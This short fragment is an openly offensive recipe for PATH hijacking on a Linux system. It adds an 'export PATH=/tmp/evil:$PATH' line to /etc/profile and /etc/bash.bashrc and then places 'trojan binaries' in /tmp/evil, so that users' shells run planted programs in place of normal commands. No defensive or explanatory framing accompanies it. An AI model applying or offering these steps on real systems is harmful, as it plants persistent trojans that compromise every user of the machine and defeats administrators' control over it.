Prepend malicious directory to system PATH:
Add to /etc/profile: export PATH=/tmp/evil:$PATH
Add to /etc/bash.bashrc: export PATH=/tmp/evil:$PATH
Place trojan binaries in /tmp/evil